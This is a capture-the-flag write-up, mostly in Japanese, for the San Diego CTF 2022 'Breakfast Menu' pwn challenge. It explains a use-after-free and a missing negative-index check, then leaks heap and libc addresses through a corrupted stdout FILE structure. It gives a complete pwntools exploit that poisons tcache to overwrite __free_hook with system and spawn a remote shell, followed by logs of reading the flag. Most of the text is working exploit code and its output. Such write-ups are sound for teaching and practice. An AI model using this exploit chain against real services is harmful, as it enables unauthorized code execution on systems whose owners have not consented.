## Breakfast Menu

> Points: 250
>
> Solves: 32

### Description:
> I’m awfully hungry, with all these options to choose from, what should I order?
>
> Connect
> nc breakfast.sdc.tf 1337
>
> By green beans
### Attachments:
> Breakfast Menu
> 
> Dockerfile


## Analysis:

機能は、`Create`と`Edit`と`Delete`の３つで、表示機能はなし。脆弱性の発見は比較的容易なので、如何に`libc`アドレスをリークできるかがポイントになる。

```
1. Create a new order
2. Edit an order
3. Delete an order
4. Pay your bill and leave
```

脆弱性は、下記の２つ。
- `Delete`機能で領域をフリーした後にポインタをクリアしていないので`UAF`の脆弱性がある。
- `Edit`と`Delete`機能で負のインデックスのチェックを行っていない。これを利用するとインデックス値が`-12`で`_IO_2_1_stdout_`の領域を書き替えることができるので、ヒープと`libc`アドレスのリークが可能。

```c
    if (local_18 != 3) break;
    puts("which order would you like to remove");
    fflush(stdout);
    __isoc99_scanf(&DAT_00400cd5,&local_18);
    getchar();
    if (local_18 < local_14) {　　　　　　　　　　　　　<--- 負のインデックス値をチェックしていない
      free(*(void **)(orders + (long)local_18 * 8));
    }
    else {
      puts("Order doesn\'t exist!!!");
      fflush(stdout);
    }
```

```c
    if (local_18 < local_14) {　　　　　　　　　　　　　<--- 負のインデックス値をチェックしていない
      free(*(void **)(orders + (long)local_18 * 8));　　<--- フリーした後にポインタをクリアしていない
    }
    else {
      puts("Order doesn\'t exist!!!");
      fflush(stdout);
    }
```

ローカル環境では、`_IO_write_base`を`0x602010`に書き換えることで下記のように`libc`アドレスをリークさせることができるが、サーバ環境ではこれができなかった。

```python
Edit(-12, p32(0xfbad3a87)+"\x01"*0x1c+p64(0x602010))
```

```
gdb-peda$ p _IO_2_1_stdout_
$1 = {
  file = {
    _flags = 0xfbad2a84, 
    _IO_read_ptr = 0x603260, 
    _IO_read_end = 0x603260, 
    _IO_read_base = 0x603260, 
    _IO_write_base = 0x603260,  <-　この値を書き換える
    _IO_write_ptr = 0x603260, 
    _IO_write_end = 0x603260, 
    _IO_buf_base = 0x603260, 
    _IO_buf_end = 0x603660, 
```

ローカル環境で`GOT`領域を出力させた例。原因はわからないがサーバ環境は動作しない。
```
    00000000  73 6f 20 79  6f 75 20 77  61 6e 74 65  64 20 87 3a  │so y│ou w│ante│d ·:│
    00000010  ad fb 01 01  01 01 01 01  01 01 01 01  01 01 01 01  │····│····│····│····│
    00000020  01 01 01 01  01 01 01 01  01 01 01 01  01 01 10 20  │····│····│····│··· │
    00000030  60 f0 a8 de  f7 ff 7f 00  00 c6 06 40  00 00 00 00  │`···│····│···@│····│
    00000040  00 00 82 a9  f7 ff 7f 00  00 70 29 a6  f7 ff 7f 00  │····│····│·p)·│····│
    00000050  00 40 6e a4  f7 ff 7f 00  00 10 0e b7  f7 ff 7f 00  │·@n·│····│····│····│
    00000060  00 d0 0a a6  f7 ff 7f 00  00 a0 9e a6  f7 ff 7f 00  │····│····│····│····│
    00000070  00 36 07 40  00 00 00 00  00 90 07 a6  f7 ff 7f 00  │·6·@│····│····│····│
    00000080  00 70 de a5  f7 ff 7f 00  00 66 07 40  00 00 00 00  │·p··│····│·f·@│····│
    00000090  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    000000a0  00 60 e7 dc  f7 ff 7f 00  00 00 00 00  00 00 00 00  │·`··│····│····│····│
    000000b0  00 00 da dc  f7 ff 7f 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    000000c0  00 87 3a ad  fb 01 01 01  01 01 01 01  01 01 01 01  │··:·│····│····│····│
    000000d0  01 01 01 01  01 01 01 01  01 01 01 01  01 01 01 01  │····│····│····│····│
    000000e0  01 10 20 60  00 00 00 00  00 0a 00 00  00 00 00 00  │·· `│····│····│····│
    000000f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
```

`Dockerfile`の抜粋で`nsjail`で実行していることが原因かも。
```
EXEC:"nsjail --config /home/user/nsjail.cfg -- /home/user/BreakfastMenu"
```

ただし`_IO_write_base`の下位１バイトを`NULL`に書き換えるとサーバ環境でも下記のヒープ領域のみ出力可能。

```
    00000000  73 6f 20 79  6f 75 20 77  61 6e 74 65  64 20 87 3a  │so y│ou w│ante│d ·:│
    00000010  ad fb 01 01  01 01 01 01  01 01 01 01  01 01 01 01  │····│····│····│····│
    00000020  01 01 01 01  01 01 01 01  01 01 01 01  01 0a 00 00  │····│····│····│····│
    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000080  00 00 00 00  00 00 11 10  00 00 00 00  00 00 31 2e  │····│····│····│··1.│
    00000090  20 43 72 65  61 74 65 20  61 20 6e 65  77 20 6f 72  │ Cre│ate │a ne│w or│
    000000a0  64 65 72 0a  32 2e 20 45  64 69 74 20  61 6e 20 6f  │der·│2. E│dit │an o│
    000000b0  72 64 65 72  0a 33 2e 20  44 65 6c 65  74 65 20 61  │rder│·3. │Dele│te a│
    000000c0  6e 20 6f 72  64 65 72 0a  34 2e 20 50  61 79 20 79  │n or│der·│4. P│ay y│
    000000d0  6f 75 72 20  62 69 6c 6c  20 61 6e 64  20 6c 65     │our │bill│ and│ le│
```

下記の領域を出力させることが可能
```
0x603200:	0x0000000000000000	0x0000000000000000
0x603210:	0x0000000000000000	0x0000000000000000
0x603220:	0x0000000000000000	0x0000000000000000
0x603230:	0x0000000000000000	0x0000000000000000
0x603240:	0x0000000000000000	0x0000000000000000
0x603250:	0x0000000000000000	0x0000000000000111  <- サーバ環境は0x411ではなく0x111になっている。
0x603260:	0x7461657243202e0a	0x2077656e20612065
0x603270:	0x2e320a726564726f	0x6e61207469644520
0x603280:	0x330a726564726f20	0x6574656c6544202e
```

上記の限られた領域には`0x3c0`サイズの`tcache`が含まれているので、`0x3c0`サイズのchunkを別領域に作成して`Delete`するとヒープアドレスをリークさせることができる。

```python
for i in range(6):
  Create()
Delete(4)
Delete(5)
Edit(5, "\x00")
Create()
Create()
Edit(2, "A"*0x18+p64(0x3c1))
Delete(7)
```

`Delete(7)`を実行した後のヒープメモリの状態
```
0x604670:	0x0000000000000000	0x0000000000000031
0x604680:	0x0000000000000000	0x0000000000000000
0x604690:	0x0000000000000000	0x0000000000000000
0x6046a0:	0x0000000000000000	0x0000000000000031
0x6046b0:	0x0000000000000000	0x0000000000000000
0x6046c0:	0x0000000000000000	0x0000000000000000
0x6046d0:	0x0000000000000000	0x0000000000000031
0x6046e0:	0x4141414141414141	0x4141414141414141
0x6046f0:	0x4141414141414141	0x00000000000003c1
0x604700:	0x0000000000000000	0x0000000000603010
0x604710:	0x0000000000000000	0x0000000000000000
0x604720:	0x0000000000000000	0x0000000000000000
0x604730:	0x0000000000000000	0x0000000000000031
0x604740:	0x0000000000000000	0x0000000000603010
0x604750:	0x0000000000000000	0x0000000000000000
0x604760:	0x0000000000000000	0x0000000000000031
0x604770:	0x0000000000604700	0x0000000000000000
0x604780:	0x0000000000000000	0x0000000000000000
0x604790:	0x0000000000000000	0x000000000001f871
```

`0x3c0`の`tcachebin`にヒープのアドレス（`0x604700`）を入れることができるので、ヒープアドレスをリークできる。
```
gdb-peda$ x/100gx 0x603200
0x603200:	0x0000000000000000	0x0000000000000000
0x603210:	0x0000000000000000	0x0000000000000000
0x603220:	0x0000000000604700	0x0000000000000000  <- この0x604700をリークできる。
0x603230:	0x0000000000000000	0x0000000000000000
0x603240:	0x0000000000000000	0x0000000000000000
0x603250:	0x0000000000000000	0x0000000000000411
0x603260:	0x7920796150202e34	0x6c6c69622072756f
0x603270:	0x61656c20646e6120	0x6e612074690a6576

pwndbg> bins
tcachebins
0x3c0 [  1]: 0x604700 ◂— 0x0
```

ヒープアドレスがわかれば、上記の領域に偽の`chunk`を作成できるので、下記のように`libc`アドレスをリークできる。

```
0x603200:	0x0000000000000000	0x0000000000000000
0x603210:	0x4141414141414141	0x0000000000001461
0x603220:	0x00007ffff7dcdca0	0x00007ffff7dcdca0  <- この0x00007ffff7dcdca0をリークできる。
0x603230:	0x0000000000000000	0x0000000000000000
0x603240:	0x0000000000000000	0x0000000000000000
0x603250:	0x0000000000000000	0x0000000000000411
0x603260:	0x7461657243202e0a	0x2077656e20612065
0x603270:	0x2e320a726564726f	0x6e61207469644520
```

```python
# Make large chunk in tcache
Delete(0)
Delete(1)
Edit(1, p64(heap_base + 0x210))
Create()
Create()
Edit(9, "A"*8+p64(heap_offset - 0x300 + 0x61))

Delete(0)
Delete(1)
Edit(1, p64(heap_base + 0x220))
Create()
Create()

# libc leak
Delete(11)
```

`libc`アドレスをリークできれば、Edit機能を用いて`tcache`に`__free_hook`を容易に書き込める。同様に`__free_hook`に`system`関数のアドレスを書き込めるので、`/bin/sh`を書き込んだ`chunk`をfreeすることで`/bin/sh`を起動できる。

## Exploit code:
The Exploit code is below.
```python
from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './BreakfastMenu'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "breakfast.sdc.tf"
  PORT = 1337
  s = remote(HOST, PORT)
  heap_offset = 0x2300
else:
  s = process(BINARY)
  heap_offset = 0x1700
libc = elf.libc

def Create():
  s.sendlineafter("leave\n", "1")

def Edit(idx, data):
  s.sendlineafter("leave\n", "2")
  s.sendlineafter("modify\n", str(idx))
  s.sendlineafter("order?\n", data)

def Delete(idx):
  s.sendlineafter("leave\n", "3")
  s.sendlineafter("remove\n", str(idx))

for i in range(6):
  Create()

# Make fake chunk sizeof 0x3c0 for heap leaking
Delete(4)
Delete(5)
Edit(5, "\x00")
Create()
Create()
Edit(2, "A"*0x18+p64(0x3c1))

# Heap leak
Delete(7)
Edit(-12, p32(0xfbad3a87)+"\x01"*0x1b)

s.recvuntil("\x00"*0x20)
heap_leak = u64(s.recv(8))
heap_base = heap_leak - heap_offset
print "heap_leak =", hex(heap_leak)
print "heap_base =", hex(heap_base)

# Make large chunk in tcache
Delete(0)
Delete(1)
Edit(1, p64(heap_base + 0x210))
Create()
Create()
Edit(9, "A"*8+p64(heap_offset - 0x300 + 0x61))

Delete(0)
Delete(1)
Edit(1, p64(heap_base + 0x220))
Create()
Create()

# libc leak
Delete(11)
Edit(-12, p32(0xfbad3a87)+"\x01"*0x1b)
s.recvuntil("A"*8)
s.recv(8)
libc_leak = u64(s.recv(8))
libc_base = libc_leak - libc.sym.__malloc_hook - 0x70
free_hook   = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
print "libc_leak =", hex(libc_leak)
print "libc_base =", hex(libc_base)

# Write __free_hook in tcache
Delete(0)
Delete(1)
Edit(1, p64(free_hook))

# Write system address in __free_hook
Create()
Create()
Edit(13, p64(system_addr))

# Start system("/bin/sh")
Edit(3, "/bin/sh\x00")
Delete(3)

s.interactive()
```

## Results:
The execution result is as follows.
```bash
mito@ubuntu:~/CTF/San_Diego_CTF_2022/Pwn_Breakfast_Menu_250$ python solve.py r
[*] '/home/mito/CTF/San_Diego_CTF_2022/Pwn_Breakfast_Menu_250/BreakfastMenu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to breakfast.sdc.tf on port 1337: Done
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
heap_leak = 0x880300
heap_base = 0x87e000
libc_leak = 0x7fc8441e3ca0
libc_base = 0x7fc843df8000
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls -l
total 28
-rwxr-xr-x 1 nobody nogroup 13000 May  6 22:02 BreakfastMenu
-rw-r--r-- 1 nobody nogroup  2405 May  5 18:23 BreakfastMenu.c
-rw-r--r-- 1 nobody nogroup   105 Apr 29 20:55 Makefile
-rw-r--r-- 1 nobody nogroup    42 May  6 22:01 flag.txt
$ cat flag.txt
sdctf{Th3_m05t_1Mp0Rt4nT_m34L_0f_th3_d4Y}
```

## Reference:

